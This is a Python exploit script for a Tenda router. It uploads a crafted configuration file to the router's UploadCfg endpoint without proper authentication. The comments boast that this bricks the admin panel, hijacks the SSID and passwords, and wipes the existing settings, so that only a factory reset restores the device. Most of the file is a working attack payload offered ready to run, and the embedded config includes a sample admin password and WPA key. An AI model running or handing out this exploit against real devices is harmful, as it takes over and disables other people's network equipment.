#Before running this exploit there are some things to be aware of. This is an admin panel denial of service attack. it will brick the admin panel and stop anyone from changing
#or modifying anything on the device from the admin panel. the only way to resolve this explit is a full factory reset.
import requests

#Change this to the ip of the router.
ip='192.168.2.1' #Change Me

#where the router begins and stops assigning ip addresses
dhcpStart='192.168.2.100' #Change Me
dhcpEnd='192.168.2.150' #Change Me


#this will be the name of the router, password of everything! Full Take over!
#if you do this it will destroy any configuration you have set. run with caution!
hijack='changeme' #Change Me


url = "http://" + ip + "/cgi-bin/UploadCfg"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://" + ip + "/system_backup.asp",
    "Origin": "http://" + ip,
    "Connection": "keep-alive",
    "Cookie": "language=en; admin:language=en",
    "Upgrade-Insecure-Requests": "1",
}

# Edit this to your liking, by default, it hijacks all input fields.
# Sets admin Password, Routername and router password to the same value
config_content = f"""
#Please don't change this file by hand
wl0.1_radius_port=
dhcp_static_lease3=
wl_radius_port=1812
dhcp_static_lease4=
dhcp_static_lease5=
dhcp_static_lease6=
wl0_wmf_bss_enable=0
wl0_rxchain_pwrsave_stas_assoc_check=0
dhcp_static_lease7=
wan0_primary=1
wl0_mcast_regen_bss_enable=1
wl0_rifs_advert=auto
wl_txstreams=0
dhcp_static_lease8=
wl0_frameburst=off
wl_rxchain_pwrsave_pps=10
dhcp_static_lease9=
wan0_ipaddr=0.0.0.0
log_ipaddr=
wan0_proto=dhcp
wl0.1_wps_pin=
wl_nctrlsb=none
wl_version=5.100.138.21
ddns_enable=0
wl0_leddc=0x640000
wl0_aporwds=0
wl0_akm=psk
wl_maxassoc=128
c8021x_en=
wan0_dns=
wps_modelname=Tenda
wl_leddc=0x640000
wl_rxchain_pwrsave_stas_assoc_check=0
wl_phytypes=
wan0_l2tp_username=
wl0_infra=1
fw_disable=0
wl0_country_code=US
wl0_wps_method=pbc
wl_infra=1
filter_url_mode=disable
wl0_bcn_rotate=1
wl_stbc_tx=auto
restore_defaults=0
wan0_ifname=vlan2
wl0.1_key=
wl0.1_hwaddr=CA:3A:35:12:B0:29
wl_old_ssid=TAKASHI
wan0_pptp_demand=0
wl0_nctrlsb=none
wl0_version=5.100.138.21
http_wanport=
rm_web_port=8080
wl_radius_ipaddr=
lan_gateway={ip}
wl0_ifname=eth1
lan_domain=
timer_interval=3600
wl_net_reauth=36000
forward_port0=
lan1_ipaddr={ip}
wl0_rxchain_pwrsave_quiet_time=1800
forward_port1=
wl0_rxstreams=0
forward_port2=
gpio6=sys_led
forward_port3=
forward_port4=
lan_route=
wl0_radio_pwrsave_level=0
wps_device_pin=12345670
forward_port5=
wl0_mrate=0
forward_port6=
wl0_mode=ap
dhcp_start={dhcpStart}
forward_port7=
hacker_att=1
forward_port8=
wl0_stbc_tx=auto
forward_port9=
lan1_route=
wl0_ap_isolate=0
dhcp_end={dhcpEnd}
wl0_rxchain_pwrsave_pps=10
wl_mrate=0
wl_wmf_bss_enable=0
wl_akm=psk
wl0_gmode=1
wl0_ampdu=auto
is_default=1
wl_obss_coex=0
wl0_nband=2
wl_gmode=1
wl_ampdu=auto
stats_server=
wl0_nreqd=0
wl0.1_crypto=
lan_netmask=255.255.255.0
lan1_ifname=br1
wl_nband=2
http_username=admin
lan1_hwnames=
wl0_ssid={hijack}
wl0_dtim=3
wan0_pppoe_ifname=ppp0
wl_nreqd=0
os_date=Sep 11 2012
wl0_dfs_preism=60
http_lanport=80
wl_plcphdr=short
lan1_wins=
wl_macmode=disabled
wl_mimo_preamble=auto
nvram_version=1
lan_lease=86400
wl0_key1=ASCII
wl_phytype=n
wan0_hostname=
wl0_key2=ASCII
wl0_vlan_prio_mode=off
wl_lazywds=0
wl0_key3=ASCII
wl_dfs_postism=60
wl0.1_maclist=
wl_mcast_regen_bss_enable=1
wl0_key4=ASCII
filter_client0=
filter_client1=
wan0_l2tp_gateway=0.0.0.0
lan1_lease=86400
wl0_vifs=
filter_client2=
wl_auth_mode=none
filter_client3=
filter_client4=
filter_mac_mode=disable
filter_client5=
filter_client6=
filter_client7=
wl0_rxchain_pwrsave_enable=1
wl0_hw_rxchain=1
wl_wpa_psk=3512B028
http_passwd=steampunk
filter_client8=
filter_client9=
nat_type=sym
lan_stp=1
tc_stream_stat_en=0
wan0_pptp_idletime=0
wl0.1_radius_key=
wl0_bss_maxassoc=128
wl_mode=ap
wan0_pppoe_passwd=
wps_randomssid=TAKASHI
wl0_closed=0
wl0_rate=0
wl0_plcphdr=short
wl0_macmode=disabled
wl_wpa_gtk_rekey=0
tc_0=
lan_dhcp=0
wl0_radioids=BCM2057
tc_1=
wl0_phytype=n
tc_2=
wl0_lazywds=0
tc_3=
c8021x_user=
tc_4=
tc_5=
rm_web_en=0
wan0_pppoe_keepalive=1
tc_6=
tc_7=
wl0_afterburner=off
tc_8=
wl0_antdiv=-1
lan_hwaddr=C8:3A:35:12:B0:28
wl_wds_timeout=0
wl0.1_auth_mode=
tc_9=
wl_wps_mode=disabled
wl0.1_akm=
wan0_l2tp_netmask=0.0.0.0
wan0_pppoe_ac=
dmz_ipaddr_en=
wl_ssid=TAKASHI_12B028
wl_dtim=3
wl0.1_ifname=
lan_wps_oob=disabled
wl0_wpa_psk=3512B028
wan0_pptp_username=
wl0_amsdu=auto
dhcp_wins=wan
wan0_pppoe_prio_xkjs=0
os_server=
lan_wps_reg=enabled
wl_amsdu=auto
wl_key1=ASCII
wl_key2=ASCII
wan0_pppoe_mru=1492
wl0_unit=0
wl_key3=ASCII
wan0_mtu=1500
wl_country_code=US
wl_key4=ASCII
wl_hwaddr=
wan0_l2tp_static=0
wl0_bss_enabled=1
wl0_net_reauth=36000
wl_vlan_prio_mode=off
wps_timeout_enable=0
wan0_l2tp_ipaddr=0.0.0.0
lan1_stp=1
wl0_nmode=-1
tc_isp_downrate=1024
wl_rifs_advert=auto
wl_nmode=-1
lan1_gateway={ip}
wl_wps_reg=enabled
wl_rxstreams=0
wl0_wds=
wl_rate=0
wan0_gateway=0.0.0.0
log_level=0
ntp_server=192.5.41.40 192.5.41.41 133.100.9.2
wl0_reg_mode=off
wl0.1_wps_method=
wps_mfstring=Tenda
lan_ifnames=vlan1 eth1 
wan0_l2tp_server_name=
wl0_auth=0
wl0_radius_port=1812
wl_rxchain_pwrsave_quiet_time=1800
wl0_radius_ipaddr=
wl0_rxchain=1
wl_radio_pwrsave_pps=10
ure_disable=1
wan0_l2tp_ifname=ppp0
wan0_l2tp_dns=
wan0_pptp_keepalive=1
wan_ifnames=vlan2 
wan0_domain=
wl_rateset=12
wl_crypto=aes
ping_dis_wan=0
wan0_pptp_dns=
wl0_wps_reg=enabled
wl0.1_mode=
os_name=linux
lan_proto=dhcp
lan_ipaddr={ip}
wl_radius_key=
wl_rxchain_pwrsave_enable=1
lan1_netmask=255.255.255.0
wl0_maxassoc=128
wan0_route=
wl_unit=0
wan0_pppoe_demand=0
wl0_phytypes=n
lan1_proto=static
router_disable=0
wl0_wep=disabled
wl0_frag=2346
wps_sta_pin=00000000
wl0.1_closed=
wan0_netmask=0.0.0.0
wl0.1_ap_isolate=
wl_radio_pwrsave_enable=0
wan0_pptp_gateway=0.0.0.0
wl0_rifs=auto
wl_radio_pwrsave_stas_assoc_check=0
dmz_ipaddr=
wan0_pppoe_st=0
wan0_wins=
wl_wds=
wl0.1_radius_ipaddr=
wan0_l2tp_passwd=
time_mode=0
wl0.1_ssid=
wl0_rateset=12
wl0_old_ssid=TAKASHI
wl0_ure=0
wan0_l2tp_keepalive=1
wan0_pptp_static=0
os_language=en
wl0_txstreams=0
wl0.1_radio=
wan0_pptp_ipaddr=0.0.0.0
wan0_connect=Disconnect
lan_ifname=br0
wl0_mimo_preamble=auto
wan0_pptp_server_name=
wan0_pppoe_mtu=1492
wl0.1_key1=
dhcp_domain=wan
wl0.1_key2=
wl0.1_bss_maxassoc=
filter_client_cur_nu=1
wl_auth=0
wl0.1_key3=
filter_client_mode=disable
wl0.1_key4=
lan1_domain=
wan0_l2tp_mru=1452
ezc_enable=1
wl_bss_maxassoc=128
wl_frameburst=off
wl0_radio_pwrsave_pps=10
wl0_radio_pwrsave_stas_assoc_check=0
wan0_pptp_mru=1452
tc_isp_uprate=1024
wan0_pptp_netmask=0.0.0.0
wl0_rts=2347
wl_ifname=
lan1_dhcp=0
wl_nbw_cap=1
wl_wep=disabled
wl0_hw_txchain=1
os_version=5.110.27.21
wan0_pptp_ifname=ppp0
wl_gmode_protection=auto
lan1_wps_oob=enabled
wl0_wpa_gtk_rekey=0
wl0_sta_retry_time=5
wan0_desc=Default Connection
wl_frag=2346
wl0.1_macmode=
wl0_key=1
wl_wps_method=pbc
wl_maclist=
wl_rifs=auto
console_loglevel=1
lan1_wps_reg=enabled
time_zone=8
wl_ure=0
wl_bcn_rotate=1
wl_wps_config_state=0
wan0_pppoe_idletime=60
wan0_pppoe_service=
wl_radioids=
wan0_hwaddr=
wl0_dfs_postism=60
wl_corerev=
wl0_radio=1
wl_nmcsidx=-1
wl0.1_wpa_psk=
wl0_nbw_cap=1
wl_channel=0
wps_mode=disabled
wl0_bcn=100
wl0_hwaddr=C8:3A:35:12:B0:28
wl_radio=1
wl_afterburner=off
wps_wer_mode=allow
wan0_pptp_passwd=
wl0.1_unit=
ezc_version=2
wl0_gmode_protection=auto
wl0.1_wpa_gtk_rekey=
rm_web_ip=
wl0_maclist=
wl_radio_pwrsave_quiet_time=1800
wan0_pptp_mppe_en=1
wl0_obss_coex=0
ddns_set1=
wl_rts=2347
filter_mac_cur_nu=1
lan_wins=
wl_ap_isolate=0
wps_modelnum=123456
lan_hwnames=
lan1_ifnames=wl0.1 wl0.2 wl0.3 wl1.1 wl1.2 wl1.3
filter_url_cur_nu=1
c8021x_pswd=
wan0_pppoe_username=
wan0_unit=0
wl0_radius_key=
wl0_wps_config_state=0
wan0_ifnames=vlan2
wl0_nmcsidx=-1
wl0_corerev=28
wan0_l2tp_demand=0
wl_key=1
wl0_channel=0
wl0.1_infra=
wps_device_name=Tenda Wireless AP
wl0_wds_timeout=0
wl0.1_bss_enabled=
upnp_enable=1
wl0_wps_mode=disabled
wl_bss_enabled=1
wps_config_method=0x84
sb/1/ledbh6=11
dhcp_static_lease10=
filter_mac0=
filter_url0=
wl0.1_auth=
dhcp_static_lease11=
filter_mac1=
filter_url1=
wan0_l2tp_mtu=1452
wan0_pppoe_et=0
lan1_hwaddr=
wl0_radio_pwrsave_quiet_time=1800
wl_dfs_preism=60
wl0.1_wep=
dhcp_static_lease12=
filter_mac2=
filter_url2=
wl_sta_retry_time=5
dhcp_static_lease13=
filter_mac3=
filter_url3=
wan0_dns_fix=0
wl0_auth_mode=none
wl_closed=0
dhcp_static_lease14=
filter_mac4=
filter_url4=
wl0_radio_pwrsave_enable=0
dhcp_static_lease15=
autofw_port0=
tc_enable=0
filter_mac5=
filter_url5=
dhcp_static_lease16=
filter_mac6=
filter_url6=
wan0_pptp_mtu=1452
wl0_crypto=aes
wl_aporwds=0
filter_mac7=
filter_url7=
wl0_txchain=1
filter_mac8=
filter_url8=
wl_bcn=100
filter_mac9=
filter_url9=
wan0_l2tp_idletime=0
wl_reg_mode=off
dhcp_static_lease1=
wl_radio_pwrsave_level=0
dhcp_static_lease2=
wl_antdiv=-1
"""

# Construct multipart/form-data payload
files = {
    "fileCfg": ("GetRektNerd.cfg", config_content, "application/octet-stream")
}

response = requests.post(url, headers=headers, files=files)

print("Status Code:", response.status_code)
print("Exploit Sent! ðŸ”¥ðŸ”¥ðŸ”¥")
